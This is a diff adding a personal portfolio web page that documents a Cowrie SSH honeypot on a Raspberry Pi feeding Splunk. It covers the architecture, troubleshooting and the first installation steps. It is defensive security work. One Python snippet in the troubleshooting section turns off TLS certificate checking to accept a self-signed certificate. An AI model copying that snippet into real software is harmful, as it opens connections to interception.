@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SSH Honeypot on Raspberry Pi — Cowrie | Abdelkrim Zouaki</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+<style>
+:root{--bg:#0a0a0a;--surface:#111111;--border:rgba(255,255,255,0.08);--border-h:rgba(255,255,255,0.22);--text:#555555;--text-l:#aaaaaa;--text-h:#f0f0f0;--accent:#eeeeee;--red:#ff4444;}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:auto;}
+body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;overflow-x:hidden;line-height:1.75;cursor:none;}
+
+#cursor-dot{position:fixed;width:8px;height:8px;background:var(--accent);border-radius:50%;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);transition:transform 0.15s,opacity 0.2s;mix-blend-mode:screen;}
+#cursor-ring{position:fixed;width:36px;height:36px;border:1px solid rgba(255,255,255,0.5);border-radius:50%;pointer-events:none;z-index:9998;transform:translate(-50%,-50%);transition:width 0.25s,height 0.25s,border-color 0.25s;}
+#cursor-canvas{position:fixed;inset:0;pointer-events:none;z-index:9997;}
+
+#grain{position:fixed;inset:-100%;width:400%;height:400%;z-index:9996;pointer-events:none;opacity:0.038;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 512 512' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");animation:grain 0.6s steps(1) infinite;}
+@keyframes grain{0%,100%{transform:translate(0,0)}10%{transform:translate(-3%,-2%)}20%{transform:translate(2%,3%)}30%{transform:translate(-1%,1%)}40%{transform:translate(1%,-3%)}50%{transform:translate(-2%,2%)}60%{transform:translate(3%,-1%)}70%{transform:translate(-1%,3%)}80%{transform:translate(2%,1%)}90%{transform:translate(-3%,-1%)}}
+
+#progress-bar{position:fixed;top:0;left:0;height:2px;width:0%;background:linear-gradient(90deg,var(--accent),rgba(255,255,255,0.3));z-index:10000;box-shadow:0 0 12px rgba(255,255,255,0.6);transition:width 0.1s linear;}
+
+::-webkit-scrollbar{width:4px;}::-webkit-scrollbar-track{background:transparent;}::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.2);border-radius:2px;}
+
+.page-nav{position:fixed;top:0;left:0;right:0;height:56px;z-index:100;background:rgba(18,20,20,0.90);backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);border-bottom:1px solid rgba(255,255,255,0.07);display:flex;align-items:center;justify-content:space-between;padding:0 6%;}
+.nav-back{font-family:'Fira Code',monospace;font-size:0.72rem;letter-spacing:0.05em;color:var(--text);transition:color 0.2s;display:flex;align-items:center;gap:6px;text-decoration:none;}
+.nav-back:hover{color:var(--accent);}
+.nav-crumb{font-family:'Fira Code',monospace;font-size:0.66rem;color:var(--text);opacity:0.4;letter-spacing:0.06em;}
+.nav-ext{font-family:'Fira Code',monospace;font-size:0.72rem;color:var(--text);text-decoration:none;transition:color 0.2s;}
+.nav-ext:hover{color:var(--accent);}
+
+.hero-section{position:relative;min-height:100vh;display:flex;align-items:flex-end;padding:0 6% 7rem;overflow:hidden;}
+.hero-section::before{content:'';position:absolute;inset:0;background-image:linear-gradient(rgba(255,255,255,0.025) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,0.025) 1px,transparent 1px);background-size:80px 80px;pointer-events:none;}
+.hero-section::after{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 70% 55% at 30% 20%,rgba(255,255,255,0.05) 0%,transparent 65%),linear-gradient(to bottom,transparent 40%,var(--bg) 100%);pointer-events:none;}
+.hero-orb{position:absolute;width:600px;height:600px;border-radius:50%;background:radial-gradient(circle,rgba(255,255,255,0.07) 0%,transparent 70%);top:-100px;left:-100px;pointer-events:none;animation:orb-drift 12s ease-in-out infinite alternate;}
+@keyframes orb-drift{0%{transform:translate(0,0);}100%{transform:translate(60px,40px);}}
+.hero-inner{position:relative;z-index:2;max-width:820px;margin:0 auto;width:100%;}
+.hero-eyebrow{font-family:'Fira Code',monospace;font-size:0.68rem;color:var(--accent);letter-spacing:0.18em;margin-bottom:1.5rem;opacity:0.8;display:block;}
+.hero-title{font-family:'Space Grotesk',sans-serif;font-size:clamp(3rem,8vw,6.5rem);font-weight:700;color:var(--text-h);line-height:0.92;letter-spacing:-0.045em;margin-bottom:1.5rem;animation:glitch-skew 7s infinite;}
+.hero-title .line{display:block;overflow:hidden;}
+.word-w{display:inline-block;overflow:hidden;vertical-align:bottom;}
+.word-i{display:inline-block;}
+.hero-sub{font-size:1.05rem;color:var(--text-l);font-weight:400;margin-bottom:2.5rem;line-height:1.7;max-width:600px;}
+.hero-meta{display:flex;flex-wrap:wrap;gap:1.5rem;align-items:center;font-family:'Fira Code',monospace;font-size:0.7rem;color:var(--text);opacity:0.55;margin-bottom:2rem;}
+.hero-tags{display:flex;flex-wrap:wrap;gap:0.5rem;margin-bottom:1.5rem;}
+
+.hero-stat{position:absolute;right:6%;bottom:6rem;z-index:3;text-align:right;}
+.hero-stat-val{font-family:'Space Grotesk',sans-serif;font-size:clamp(4.5rem,10vw,8rem);font-weight:700;color:var(--accent);letter-spacing:-0.06em;line-height:1;text-shadow:0 0 80px rgba(255,255,255,0.25);}
+.hero-stat-label{font-family:'Fira Code',monospace;font-size:0.65rem;color:var(--text);opacity:0.55;letter-spacing:0.1em;margin-top:6px;text-transform:uppercase;}
+
+@keyframes glitch-skew{0%,90%,100%{clip-path:none;text-shadow:none;}91%{clip-path:polygon(0 25%,100% 25%,100% 40%,0 40%);text-shadow:-3px 0 #ff0066,3px 0 var(--accent);}93%{clip-path:polygon(0 60%,100% 60%,100% 80%,0 80%);text-shadow:3px 0 #ff0066,-3px 0 var(--accent);}95%{clip-path:none;text-shadow:none;}}
+
+.tag{font-family:'Fira Code',monospace;font-size:0.65rem;padding:4px 12px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.18);border-radius:4px;color:var(--accent);white-space:nowrap;display:inline-block;letter-spacing:0.04em;transition:background 0.2s,border-color 0.2s;}
+.tag:hover{background:rgba(255,255,255,0.12);border-color:rgba(255,255,255,0.35);}
+.tag-red{background:rgba(255,68,68,0.08);border-color:rgba(255,68,68,0.25);color:#ff8888;}
+
+.wrap{max-width:1060px;margin:0 auto;padding:4rem 5% 8rem;}
+
+.glass{background:var(--surface);border:1px solid var(--border);border-radius:16px;padding:2rem;margin-bottom:1.5rem;transition:border-color 0.35s,box-shadow 0.35s;position:relative;overflow:hidden;}
+.glass::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.18),transparent);opacity:0;transition:opacity 0.35s;}
+.glass:hover{border-color:var(--border-h);box-shadow:0 0 40px rgba(255,255,255,0.04);}
+.glass:hover::before{opacity:1;}
+
+.s-title{font-family:'Space Grotesk',sans-serif;font-size:1.1rem;font-weight:700;color:var(--text-h);margin-bottom:1.5rem;display:flex;align-items:center;gap:12px;letter-spacing:-0.02em;}
+.s-num{font-family:'Fira Code',monospace;font-size:0.7rem;color:var(--accent);opacity:0.8;flex-shrink:0;}
+.s-title::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,var(--border) 0%,transparent 100%);}
+
+.metric-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:1rem;}
+@media(min-width:560px){.metric-grid{grid-template-columns:repeat(4,1fr);}}
+.metric-card{background:rgba(14,16,16,0.8);border:1px solid var(--border);border-radius:12px;padding:1.5rem;text-align:center;transition:border-color 0.3s,transform 0.3s,box-shadow 0.3s;position:relative;overflow:hidden;}
+.metric-card::after{content:'';position:absolute;inset:0;background:radial-gradient(circle at 50% 0%,rgba(255,255,255,0.08) 0%,transparent 60%);opacity:0;transition:opacity 0.3s;}
+.metric-card:hover{border-color:var(--border-h);transform:translateY(-3px);box-shadow:0 8px 30px rgba(255,255,255,0.06);}
+.metric-card:hover::after{opacity:1;}
+.metric-val{font-family:'Space Grotesk',sans-serif;font-size:1.8rem;font-weight:700;color:var(--text-h);letter-spacing:-0.04em;line-height:1;}
+.metric-label{font-family:'Fira Code',monospace;font-size:0.6rem;color:var(--text);margin-top:8px;line-height:1.5;opacity:0.85;}
+
+.pull-quote{border-left:3px solid var(--accent);margin:2rem 0;padding:1.25rem 1.75rem;background:rgba(255,255,255,0.04);border-radius:0 12px 12px 0;}
+.pull-quote p{font-family:'Space Grotesk',sans-serif;font-size:1.05rem;font-weight:500;color:var(--text-h);line-height:1.65;letter-spacing:-0.01em;font-style:italic;margin:0;}
+
+.step-card{background:rgba(14,16,16,0.6);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin-bottom:1rem;position:relative;overflow:hidden;transition:border-color 0.3s;}
+.step-card:hover{border-color:var(--border-h);}
+.step-card::before{content:'';position:absolute;top:0;left:0;width:2px;height:100%;background:linear-gradient(to bottom,var(--accent),transparent);}
+.step-num{font-family:'Fira Code',monospace;font-size:0.63rem;color:var(--accent);opacity:0.75;margin-bottom:6px;display:block;letter-spacing:0.1em;}
+.step-title{font-family:'Space Grotesk',sans-serif;font-size:1rem;font-weight:600;color:var(--text-h);margin-bottom:0.65rem;letter-spacing:-0.02em;}
+.step-body{font-size:0.87rem;color:var(--text-l);line-height:1.75;}
+
+.step-card-err{background:rgba(255,68,68,0.04);border:1px solid rgba(255,68,68,0.2);border-radius:12px;padding:1.5rem;margin-bottom:1rem;position:relative;overflow:hidden;transition:border-color 0.3s;}
+.step-card-err::before{content:'';position:absolute;top:0;left:0;width:2px;height:100%;background:linear-gradient(to bottom,var(--red),transparent);}
+.step-card-err:hover{border-color:rgba(255,68,68,0.4);}
+.err-num{font-family:'Fira Code',monospace;font-size:0.63rem;color:var(--red);opacity:0.85;margin-bottom:6px;display:block;letter-spacing:0.1em;}
+.err-title{font-family:'Space Grotesk',sans-serif;font-size:1rem;font-weight:600;color:#ff8888;margin-bottom:0.65rem;letter-spacing:-0.02em;}
+.err-body{font-size:0.87rem;color:var(--text-l);line-height:1.75;}
+.err-fix{margin-top:0.75rem;font-size:0.82rem;color:#9df5c5;font-family:'Fira Code',monospace;}
+.err-fix::before{content:'→ FIX: ';opacity:0.6;}
+
+.spec-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;}
+@media(max-width:540px){.spec-grid{grid-template-columns:1fr;}}
+.spec-card{background:rgba(14,16,16,0.6);border:1px solid var(--border);border-radius:10px;padding:1.25rem;}
+.spec-label{font-family:'Fira Code',monospace;font-size:0.63rem;color:var(--accent);opacity:0.7;margin-bottom:10px;letter-spacing:0.1em;display:block;}
+.spec-item{font-size:0.83rem;color:var(--text-l);padding:3px 0;display:flex;align-items:center;gap:8px;}
+.spec-item::before{content:'▹';color:var(--accent);font-size:0.72rem;flex-shrink:0;}
+
+.bullet-list{list-style:none;padding:0;}
+.bullet-list li{display:flex;align-items:flex-start;gap:10px;padding:0.35rem 0;font-size:0.87rem;color:var(--text-l);line-height:1.65;}
+.bullet-list li::before{content:'▹';color:var(--accent);flex-shrink:0;margin-top:1px;font-size:0.78rem;}
+
+.alert-info{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.18);border-radius:10px;padding:1rem 1.25rem;font-size:0.85rem;color:#9df5c5;}
+.alert-warning{background:rgba(251,191,36,0.06);border:1px solid rgba(251,191,36,0.22);border-radius:10px;padding:1rem 1.25rem;font-size:0.85rem;color:#fde68a;}
+.alert-error{background:rgba(255,68,68,0.06);border:1px solid rgba(255,68,68,0.22);border-radius:10px;padding:1rem 1.25rem;font-size:0.85rem;color:#ff8888;}
+
+.arch-box{background:rgba(14,16,16,0.9);border:1px solid var(--border);border-radius:12px;padding:1.75rem;font-family:'Fira Code',monospace;font-size:0.78rem;color:var(--text-l);line-height:2.2;overflow-x:auto;}
+.arch-box .hl{color:var(--accent);}
+.arch-box .red{color:#ff8888;}
+.arch-box .green{color:#9df5c5;}
+.arch-box .arrow{color:rgba(255,255,255,0.3);}
+
+pre[class*="language-"]{background:rgba(8,10,10,0.95)!important;border:1px solid rgba(255,255,255,0.12)!important;border-radius:10px!important;margin:1rem 0!important;font-size:0.75rem!important;line-height:1.85!important;overflow-x:auto;}
+code[class*="language-"]{font-family:'Fira Code',monospace!important;font-size:0.75rem!important;}
+:not(pre)>code{font-family:'Fira Code',monospace;font-size:0.82em;background:rgba(255,255,255,0.07);border:1px solid rgba(255,255,255,0.15);border-radius:4px;padding:1px 6px;color:var(--accent);}
+
+.btn-outline{font-family:'Fira Code',monospace;font-size:0.75rem;letter-spacing:0.08em;padding:12px 32px;border:1px solid rgba(255,255,255,0.35);color:var(--accent);border-radius:8px;transition:border-color 0.3s,box-shadow 0.3s;display:inline-block;text-decoration:none;background:transparent;position:relative;overflow:hidden;cursor:none;}
+.btn-outline::before{content:'';position:absolute;inset:0;background:rgba(255,255,255,0.08);transform:scaleX(0);transform-origin:left;transition:transform 0.3s ease;}
+.btn-outline:hover::before{transform:scaleX(1);}
+.btn-outline:hover{border-color:rgba(255,255,255,0.6);box-shadow:0 0 24px rgba(255,255,255,0.12);}
+
+footer{text-align:center;padding:2rem 5%;font-family:'Fira Code',monospace;font-size:0.68rem;color:var(--text);opacity:0.4;border-top:1px solid var(--border);}
+
+.mt-3{margin-top:0.75rem;}.mt-4{margin-top:1rem;}.mb-8{margin-bottom:2rem;}.mt-10{margin-top:2.5rem;}
+p{margin-bottom:0.85rem;}
+p:last-child{margin-bottom:0;}
+</style>
+</head>
+<body>
+
+<div id="cursor-dot"></div>
+<div id="cursor-ring"></div>
+<canvas id="cursor-canvas"></canvas>
+<div id="grain" aria-hidden="true"></div>
+<div id="progress-bar" aria-hidden="true"></div>
+
+<nav class="page-nav">
+  <a href="../index.html" class="nav-back">
+    <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 12H5M12 5l-7 7 7 7"/></svg>
+    Portfolio
+  </a>
+  <span class="nav-crumb">Projects / SSH Honeypot</span>
+  <a href="https://github.com/karim871" target="_blank" rel="noopener noreferrer" class="nav-ext">GitHub ↗</a>
+</nav>
+
+<section class="hero-section" id="hero">
+  <div class="hero-orb"></div>
+  <div class="hero-inner">
+    <span class="hero-eyebrow">PROJECTS / HONEYPOT SECURITY</span>
+    <div class="hero-tags">
+      <span class="tag">SSH Honeypot</span>
+      <span class="tag">Cowrie</span>
+      <span class="tag">Raspberry Pi</span>
+      <span class="tag">Linux</span>
+      <span class="tag">Python</span>
+      <span class="tag">Splunk</span>
+      <span class="tag">Threat Intelligence</span>
+    </div>
+    <h1 class="hero-title" id="hero-title">
+      <span class="line" id="hl1">SSH Honeypot on</span>
+      <span class="line" id="hl2">Raspberry Pi</span>
+    </h1>
+    <p class="hero-sub">A Cowrie SSH honeypot deployed on a Raspberry Pi Zero 2 WH — trapping attackers on port 22, recording every keystroke, capturing every credential, and piping live threat data into Splunk.</p>
+    <div class="hero-meta">
+      <span>June 2026</span>
+      <span style="opacity:0.3">·</span>
+      <span>Raspberry Pi Zero 2 WH</span>
+      <span style="opacity:0.3">·</span>
+      <span>Cowrie v3.0.3</span>
+      <span style="opacity:0.3">·</span>
+      <span>Splunk HEC</span>
+    </div>
+  </div>
+  <div class="hero-stat" id="hero-stat">
+    <div class="hero-stat-val">:22</div>
+    <div class="hero-stat-label">Honeypot Port<br>Attacker Trap</div>
+  </div>
+</section>
+
+<main class="wrap">
+
+  <div class="metric-grid mb-8" id="metrics">
+    <div class="metric-card">
+      <div class="metric-val">Port 22</div>
+      <div class="metric-label">Cowrie honeypot<br>fake shell</div>
+    </div>
+    <div class="metric-card">
+      <div class="metric-val">:2222</div>
+      <div class="metric-label">Real SSH<br>hidden port</div>
+    </div>
+    <div class="metric-card">
+      <div class="metric-val">100%</div>
+      <div class="metric-label">Credentials<br>captured</div>
+    </div>
+    <div class="metric-card">
+      <div class="metric-val">SIEM</div>
+      <div class="metric-label">Live events<br>in Splunk</div>
+    </div>
+  </div>
+
+  <!-- 01. Overview -->
+  <div class="glass">
+    <div class="s-title"><span class="s-num">01.</span> Project Overview</div>
+    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.85;margin-bottom:1rem;">This project adds a third perimeter layer to my home security stack — sitting alongside the Pi-hole DNS sinkhole and the Suricata/Splunk mini-SOC. While Pi-hole blocks malicious domains before a connection is established and Suricata monitors live network traffic, Cowrie operates at the attacker's first point of entry: SSH port 22.</p>
+    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.85;margin-bottom:1rem;">Cowrie is a medium-interaction SSH honeypot that emulates a real Linux shell. When an attacker connects on port 22, they land in a convincingly realistic fake environment — complete with a fake filesystem, fake users in <code>/etc/passwd</code>, and responsive shell commands. Meanwhile, every credential they try, every command they type, and every file they attempt to download is silently logged to structured JSON and forwarded in real-time to Splunk.</p>
+    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.85;">The real SSH daemon was quietly moved to port 2222 — invisible to scanners that target port 22 by default. Anyone probing the standard SSH port is talking to Cowrie.</p>
+    <div class="pull-quote">
+      <p>"The goal isn't just detection — it's intelligence. Every failed login attempt is a credential to profile. Every command run is a TTP to map. Every session is a window into attacker methodology."</p>
+    </div>
+  </div>
+
+  <!-- 02. Architecture -->
+  <div class="glass">
+    <div class="s-title"><span class="s-num">02.</span> System Architecture</div>
+    <div class="arch-box">
+      <span class="green">[ ATTACKER ]</span> <span class="arrow">──────────────────────────────────────────────────────────────────</span>▶<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl">SSH :22</span> <span class="arrow">──▶</span> <span class="hl">Cowrie Honeypot</span> <span class="arrow">──▶</span> <span class="green">cowrie.json</span><br>
+      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">──▶</span> <span class="hl">cowrie_to_splunk.py</span><br>
+      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">──▶</span> <span class="green">Splunk HEC :8088</span><br>
+      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">──▶</span> <span class="green">index=main (structured JSON)</span><br>
+      <br>
+      <span class="red">[ ADMIN ]</span> <span class="arrow">────────────────────────────────────────────────────────────────────</span>▶<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl">SSH :2222</span> <span class="arrow">──▶</span> <span class="hl">Real OpenSSH</span> <span class="arrow">──▶</span> <span class="green">Raspberry Pi shell</span><br>
+      <br>
+      <span style="opacity:0.4">Services: cowrie.service + cowrie-splunk.service (systemd, enabled on boot)</span>
+    </div>
+    <div class="alert-info mt-4">The Pi is on the local network at <strong>10.0.0.153</strong>. Cowrie runs as a dedicated unprivileged <code>cowrie</code> user. <code>authbind</code> grants it permission to bind port 22 without root. The real SSH daemon listens on port 2222 and is never exposed on the default port.</div>
+  </div>
+
+  <!-- 03. Technical Specs -->
+  <div class="glass">
+    <div class="s-title"><span class="s-num">03.</span> Technical Specifications</div>
+    <div class="spec-grid">
+      <div class="spec-card">
+        <span class="spec-label">HARDWARE</span>
+        <div class="spec-item">Raspberry Pi Zero 2 WH</div>
+        <div class="spec-item">512 MB RAM, quad-core Cortex-A53</div>
+        <div class="spec-item">MicroSD — WiFi only (no ethernet)</div>
+        <div class="spec-item">SSID: Mehdi — Static IP: 10.0.0.153</div>
+      </div>
+      <div class="spec-card">
+        <span class="spec-label">SOFTWARE</span>
+        <div class="spec-item">Raspberry Pi OS Lite 32-bit (Trixie)</div>
+        <div class="spec-item">Cowrie v3.0.3 (SSH honeypot)</div>
+        <div class="spec-item">Python 3.13 + Twisted 26.4.0</div>
+        <div class="spec-item">authbind (port 22 without root)</div>
+      </div>
+      <div class="spec-card">
+        <span class="spec-label">PORT LAYOUT</span>
+        <div class="spec-item">:22 → Cowrie (honeypot, fake shell)</div>
+        <div class="spec-item">:2222 → Real OpenSSH (admin access)</div>
+        <div class="spec-item">Fake hostname: ubuntu-server</div>
+        <div class="spec-item">Fake users: root, phil, sshd, nobody</div>
+      </div>
+      <div class="spec-card">
+        <span class="spec-label">LOGGING PIPELINE</span>
+        <div class="spec-item">JSON logs: var/log/cowrie/cowrie.json</div>
+        <div class="spec-item">TTY recordings: var/lib/cowrie/tty/</div>
+        <div class="spec-item">Forwarder: cowrie_to_splunk.py (Python)</div>
+        <div class="spec-item">Destination: Splunk HEC :8088 (HTTPS)</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 04. The Problems -->
+  <div class="glass">
+    <div class="s-title"><span class="s-num">04.</span> Challenges &amp; Troubleshooting</div>
+    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.85;margin-bottom:1.5rem;">This project hit a wall before it even started — the Pi was offline because the home WiFi password had changed. What followed was a cascade of debugging sessions that tested every layer of the stack. Every error below was real. Every fix below was earned.</p>
+
+    <div class="step-card-err">
+      <span class="err-num">PROBLEM 01 — NETWORKING</span>
+      <div class="err-title">Pi offline — WiFi password changed</div>
+      <div class="err-body">The Raspberry Pi Zero 2 WH went dark after the home router's WiFi password was updated. An <code>nmap -sn 10.0.0.0/24</code> scan confirmed the Pi's previous IP (10.0.0.153) had disappeared from the network. The Pi has no display output — SSH was the only access method.</div>
+      <div class="err-fix">Wrote new credentials to wpa_supplicant.conf on the SD card boot partition (FAT32, readable from Windows) and added an empty <code>ssh</code> file to re-enable SSH on boot.</div>
+    </div>
+
+    <div class="step-card-err">
+      <span class="err-num">PROBLEM 02 — RASPBERRY PI OS BOOKWORM</span>
+      <div class="err-title">wpa_supplicant.conf ignored on Bookworm</div>
+      <div class="err-body">After reinserting the SD card, the Pi still didn't appear on the network. The root cause: Raspberry Pi OS Bookworm (Debian 12) replaced <code>wpa_supplicant</code> with <strong>NetworkManager</strong> as the default networking stack. The legacy <code>wpa_supplicant.conf</code> headless setup trick no longer works on Bookworm systems — the file is simply ignored.</div>
+      <div class="err-fix">Re-flashed the SD card entirely using Raspberry Pi Imager, which handles NetworkManager configuration internally via its firstrun.sh mechanism.</div>
+    </div>
+
+    <div class="step-card-err">
+      <span class="err-num">PROBLEM 03 — WSL2 USB LIMITATION</span>
+      <div class="err-title">SD card invisible in WSL2</div>
+      <div class="err-body">WSL2 runs in a Hyper-V virtual machine and does not automatically pass through USB devices from the Windows host. After installing WSL and Ubuntu, the SD card reader simply did not appear in <code>lsblk</code> — the ext4 rootfs partition (where NetworkManager keyfiles live) was unreachable without <code>usbipd-win</code>.</div>
+      <div class="err-fix">Bypassed the WSL approach entirely. Used Raspberry Pi Imager's built-in WiFi customisation screen to bake the new credentials directly into the image before flashing.</div>
+    </div>
+
+    <div class="step-card-err">
+      <span class="err-num">PROBLEM 04 — COWRIE v3 API CHANGE</span>
+      <div class="err-title">bin/cowrie: No such file or directory</div>
+      <div class="err-body">All existing Cowrie guides reference starting the honeypot with <code>bin/cowrie start</code>. Cowrie v3.x removed this script entirely. The new startup method uses <code>twistd</code> directly — the Twisted application runner — after installing the package with <code>pip install -e .</code>.</div>
+      <div class="err-fix">Installed Cowrie as a Python package (<code>pip install -e .</code>) and started it with <code>authbind --deep twistd -n cowrie</code>.</div>
+    </div>
+
+    <div class="step-card-err">
+      <span class="err-num">PROBLEM 05 — SYSTEMD FLAGS</span>
+      <div class="err-title">twistd -n: option -l not recognized</div>
+      <div class="err-body">The initial systemd service unit used <code>-l -</code> to redirect twistd logs to stdout (standard for systemd services). Cowrie's bundled twistd version does not support this flag — the service crashed immediately on every boot with the error shown in <code>journalctl</code>.</div>
+      <pre><code class="language-bash">authbind[19619]: /home/cowrie/cowrie-env/bin/twistd -n: option -l not recognized</code></pre>
+      <div class="err-fix">Removed the <code>-l -</code> flag from ExecStart. Cowrie handles its own file-based logging independently of twistd's log flags.</div>
+    </div>
+
+    <div class="step-card-err">
+      <span class="err-num">PROBLEM 06 — SPLUNK UNIVERSAL FORWARDER</span>
+      <div class="err-title">No armv7l build available for Universal Forwarder</div>
+      <div class="err-body">The Pi Zero 2 WH runs a 32-bit OS (<code>uname -m</code> → <code>armv7l</code>) despite having a 64-bit capable CPU. Splunk does not publish a Universal Forwarder build for 32-bit ARM — only x86_64 and aarch64 (64-bit ARM) are supported.</div>
+      <div class="err-fix">Switched to Splunk HTTP Event Collector (HEC). A lightweight Python script tails <code>cowrie.json</code> and POSTs each new JSON event directly to Splunk's HEC endpoint over HTTPS.</div>
+    </div>
+
+    <div class="step-card-err">
+      <span class="err-num">PROBLEM 07 — WINDOWS FIREWALL</span>
+      <div class="err-title">HEC port 8088 blocked by Windows Defender Firewall</div>
+      <div class="err-body">Curl from the Pi consistently timed out hitting <code>http://10.0.0.141:8088</code>. Splunk was running and HEC was enabled, but Windows Defender Firewall had no inbound rule for port 8088 — the connection was dropped silently at the OS level.</div>
+      <pre><code class="language-powershell">New-NetFirewallRule -DisplayName "Splunk HEC" -Direction Inbound -Protocol TCP -LocalPort 8088 -Action Allow</code></pre>
+      <div class="err-fix">Added an inbound firewall rule for TCP port 8088. Verified connectivity with curl from the Pi immediately after.</div>
+    </div>
+
+    <div class="step-card-err">
+      <span class="err-num">PROBLEM 08 — TLS SELF-SIGNED CERTIFICATE</span>
+      <div class="err-title">SSL: CERTIFICATE_VERIFY_FAILED — self-signed cert</div>
+      <div class="err-body">After fixing the firewall, the Python forwarder started throwing SSL errors. Splunk HEC defaults to HTTPS with a self-signed certificate. Python's <code>urllib.request</code> rejects self-signed certs by default — every POST returned <code>CERTIFICATE_VERIFY_FAILED</code>. The initial script also used <code>http://</code> instead of <code>https://</code>, which caused a secondary HTTP/0.9 protocol error.</div>
+      <pre><code class="language-python">import ssl
+CTX = ssl.create_default_context()
+CTX.check_hostname = False
+CTX.verify_mode = ssl.CERT_NONE
+urllib.request.urlopen(req, timeout=5, context=CTX)</code></pre>
+      <div class="err-fix">Created a custom SSL context with certificate verification disabled, and switched the URL to <code>https://</code>.</div>
+    </div>
+  </div>
+
+  <!-- 05. Installation -->
+  <div class="glass">
+    <div class="s-title"><span class="s-num">05.</span> Installation Walkthrough</div>
+
+    <div class="step-card">
+      <span class="step-num">STEP 01 — FLASH SD CARD WITH RASPBERRY PI IMAGER</span>
+      <div class="step-title">Bake WiFi credentials into the image</div>
+      <div class="step-body">Use Raspberry Pi Imager → select <strong>Raspberry Pi Zero 2 W</strong> as device → <strong>Raspberry Pi OS Lite (32-bit)</strong> as OS (the 64-bit build explicitly excludes the Zero 2 W). In the Advanced Options screen, configure hostname, enable SSH with password auth, set username/password, and enter WiFi SSID + password. The Imager generates a <code>firstrun.sh</code> that writes the correct NetworkManager keyfile on first boot.</div>
+    </div>
+
+    <div class="step-card">
+      <span class="step-num">STEP 02 — DISCOVER PI ON NETWORK</span>
+      <div class="step-title">Confirm the Pi connected to WiFi</div>
+      <div class="step-body">Give the Pi 90 seconds to boot and connect. Scan the subnet for the new device — it appears as a new IP that wasn't there before. The Pi's IP stabilized at 10.0.0.153.</div>
